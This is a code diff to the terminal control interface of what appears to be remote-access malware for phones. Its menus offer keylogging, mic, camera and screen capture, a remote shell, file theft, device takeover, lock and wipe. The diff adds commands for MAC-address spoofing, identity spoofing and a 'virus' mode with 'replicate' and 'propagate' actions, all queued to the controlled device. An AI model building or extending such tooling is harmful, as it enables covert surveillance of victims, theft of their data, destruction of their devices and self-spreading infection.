@@ -44,10 +44,11 @@ HELP = [
     ("intel", "i info · l fix · g keylog · a apps · u usage · w wifi · p perms"),
     ("files", "f <dir> list · P <path> pull"),
     ("control", "x <cmd> shell · t <msg> toast · b buzz · T re-takeover · K lock · W wipe"),
+    ("native", "n native · n probe <kind> · n spoof-mac <iface> <mac> · S spoof · V virus"),
     ("session", "r refresh · h help · q quit (Ctrl-C also)"),
 ]
 
-FOOTER = "1-9 pick · s shot · m mic · c cam · g keylog · x shell · T takeover · h help · q quit"
+FOOTER = "1-9 pick · s shot · m mic · c cam · g keylog · n native · S spoof · V virus · x shell · T takeover · h help · q quit"
 
 
 class LiveUI:
@@ -328,6 +329,30 @@ class LiveUI:
             return True
         if key == "W":
             self.queue("wipe")
+            return True
+        if key == "n":
+            if args and args[0] == "spoof-mac" and len(args) >= 3:
+                self.queue("native_spoof_mac", [args[1], args[2]])
+            elif args and args[0] == "probe":
+                self.queue("native_probe", [args[1] if len(args) > 1 else "snapshot"])
+            else:
+                self.queue("native_state")
+            return True
+        if key == "S":
+            if not args or args[0] == "status":
+                self.queue("spoof_status")
+            elif args[0] == "clear":
+                self.queue("spoof_clear", [args[1] if len(args) > 1 else "all"])
+            elif len(args) >= 2:
+                self.queue("spoof_set", [args[0], " ".join(args[1:])])
+            return True
+        if key == "V":
+            if args and args[0] == "replicate":
+                self.queue("virus_replicate", [args[1] if len(args) > 1 else ""])
+            elif args and args[0] == "propagate":
+                self.queue("virus_propagate", [args[1] if len(args) > 1 else ""])
+            else:
+                self.queue("virus_status")
             return True
         if key == "s":
             self.queue("screenshot")
